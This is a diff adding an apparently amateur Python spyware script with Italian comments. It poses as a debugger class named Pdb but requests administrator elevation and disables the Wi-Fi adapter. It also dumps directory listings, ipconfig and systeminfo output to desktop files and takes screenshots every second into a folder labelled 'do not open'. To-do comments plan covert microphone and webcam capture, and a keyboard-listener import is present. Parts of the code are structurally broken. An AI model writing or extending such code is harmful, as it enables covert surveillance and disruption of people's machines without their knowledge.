@@ -1,0 +1,92 @@
+import ctypes
+import base64
+import sys
+import pygame
+import pygame.camera
+import time
+import os
+import subprocess
+import bdb
+import pdb
+import cmd
+import pyautogui
+from pynput import keyboard
+from PIL import Image
+
+class Pdb(bdb.Bdb, cmd.Cmd):
+     
+    #####################
+    #da fare
+    #sentire il microfono
+
+    
+    ######################
+    #da fare
+    # Catturare l'immagine della webcam
+            
+    @staticmethod
+    def run_as_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+         
+    def porco_dio():
+        cmd_process = subprocess.Popen('cmd /k "netsh interface set interface "Wi-Fi" admin=disable"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        out, err = cmd_process.communicate()
+    
+        cmd_process = subprocess.Popen('cmd /k "dir"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        out, err = cmd_process.communicate()
+        with open("C:/Users/raffe/Desktop/dir.rtf", "wb") as file_uno:
+            file_uno.write(out)
+        
+        
+        cmd_process2 = subprocess.Popen('cmd /k "ipconfig"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        out, err = cmd_process2.communicate()
+        with open("C:/Users/raffe/Desktop/ip information.rtf", "wb") as file_uno:
+            file_uno.write(out)
+        
+        
+        cmd_process3 = subprocess.Popen('cmd /k "systeminfo"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+        out, err = cmd_process3.communicate()
+        with open("C:/Users/raffe/Desktop/systeminfo.rtf", "wb") as file_uno:
+            file_uno.write(out)
+    
+    
+    ##############################################################
+    # Screenshot schermo continuo che si aggiorna ad ogni immagine
+    def take_screenshot(cartella_screenshots):
+        while True:
+            os.makedirs(cartella_screenshots, exist_ok=True)
+            screenshot = pyautogui.screenshot()
+            time.sleep(1)
+            percorso_screenshot = os.path.join(cartella_screenshots, f"screenshot_{time.time()}.jpg")
+            screenshot.save(percorso_screenshot)
+    
+
+
+
+
+    if __name__ == "__main__":
+        
+        run_as_admin()
+        porco_dio()
+        
+        cartella_screenshots = "C:/Users/raffe/Desktop/python2/non aprire/immagini"
+        take_screenshot(cartella_screenshots)
+
+
+        
+
+
+
+          
+
+  
+
+
+
+
+
+
+
+   
+
+
